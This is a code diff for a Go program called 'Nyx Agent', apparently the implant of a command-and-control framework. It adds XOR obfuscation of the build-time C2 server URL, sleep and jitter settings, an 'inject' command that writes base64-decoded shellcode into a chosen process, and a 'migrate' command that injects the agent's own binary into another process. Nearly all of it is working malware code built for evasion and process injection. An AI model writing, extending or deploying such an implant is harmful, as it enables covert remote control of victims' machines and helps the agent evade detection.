@@ -18,8 +18,32 @@ import (
 	"time"
 )
 
-// Overridden at build time via -ldflags "-X main.C2URL=https://..."
-var C2URL = "http://127.0.0.1:8000"
+// Overridden at build time via -ldflags
+var C2URL       = "http://127.0.0.1:8000"
+var DefaultSleep  = "5"
+var DefaultJitter = "1"
+// XORKey: when non-empty, C2URL is a hex-encoded XOR-obfuscated string.
+// Set via -ldflags "-X main.XORKey=<key>" to enable string obfuscation.
+var XORKey = ""
+
+func init() {
+	if XORKey != "" {
+		C2URL = xorDecodeHex(C2URL, XORKey)
+	}
+}
+
+func xorDecodeHex(hexStr, key string) string {
+	if len(hexStr)%2 != 0 {
+		return hexStr
+	}
+	b := make([]byte, len(hexStr)/2)
+	for i := 0; i < len(b); i++ {
+		var val byte
+		fmt.Sscanf(hexStr[i*2:i*2+2], "%02x", &val)
+		b[i] = val ^ key[i%len(key)]
+	}
+	return string(b)
+}
 
 type CheckinRequest struct {
 	Hostname string `json:"hostname"`
@@ -298,6 +322,39 @@ func dispatch(command string) (string, string) {
 		}
 		return out, "completed"
 
+	case "inject":
+		// usage: inject <pid> <shellcode_base64>
+		injParts := strings.SplitN(arg, " ", 2)
+		if len(injParts) < 2 {
+			return "usage: inject <pid> <shellcode_base64>", "failed"
+		}
+		pid, err := strconv.Atoi(injParts[0])
+		if err != nil {
+			return "invalid PID: " + injParts[0], "failed"
+		}
+		sc, err := base64.StdEncoding.DecodeString(injParts[1])
+		if err != nil {
+			return "base64 decode error: " + err.Error(), "failed"
+		}
+		return injectShellcode(pid, sc)
+
+	case "migrate":
+		// usage: migrate <pid>  — inject a copy of ourselves into another process
+		if arg == "" {
+			return "usage: migrate <pid>", "failed"
+		}
+		pid, err := strconv.Atoi(strings.TrimSpace(arg))
+		if err != nil {
+			return "invalid PID: " + arg, "failed"
+		}
+		// Read own binary and inject it
+		exePath, _ := os.Executable()
+		binary, err := os.ReadFile(exePath)
+		if err != nil {
+			return "failed to read self: " + err.Error(), "failed"
+		}
+		return injectShellcode(pid, binary)
+
 	case "kill":
 		fmt.Println("[!] Kill command received, exiting.")
 		os.Exit(0)
@@ -446,7 +503,7 @@ func removePersistence() string {
 }
 
 func main() {
-	fmt.Println("[*] Nyx Agent v0.2.0 starting...")
+	fmt.Println("[*] Nyx Agent v0.3.0 starting...")
 
 	var agentID string
 	sleepSeconds := 5
